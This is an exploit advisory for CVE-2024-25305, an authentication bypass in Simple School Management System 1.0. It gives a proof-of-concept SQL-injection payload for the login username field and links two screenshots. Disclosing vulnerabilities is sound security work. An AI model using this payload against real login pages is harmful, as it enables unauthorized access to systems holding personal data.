# CVE-2024-25305 - Simple School Managment System - Authentication Bypass
+ **Exploit Title:** Simple School Managment System - Authentication Bypass
+ **Date:** 2024-30-01
+ **Exploit Author:** Tuba Kavgacı
+ **Vendor Homepage:** https://code-projects.org/simple-school-management-in-php-with-source-code/
+ **Software Link:** https://download.code-projects.org/details/d10e92aa-e37f-46fd-9bf8-45878956d7c0
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** CVE-2024-25305

## Description:
Simple School Managment System 1.0 allows Authentication Bypass via the `username` and `password` parameters at "http://localhost/School/". 

## Proof of Concept:
+ Go to this address: "http://localhost/School/index.php"
+ username : `'or 1=1-- -` password : `1`  and log in
+ Authentication Bypass Successful !

![Ekran görüntüsü 2024-02-01 123439](https://github.com/tubakvgc/CVEs/assets/74067343/376ef47a-ac0a-49a2-b5db-e448ae3b3262)

![Ekran görüntüsü 2024-02-01 123556](https://github.com/tubakvgc/CVEs/assets/74067343/6b76c3ee-6c53-4634-8321-37fa68bd3331)

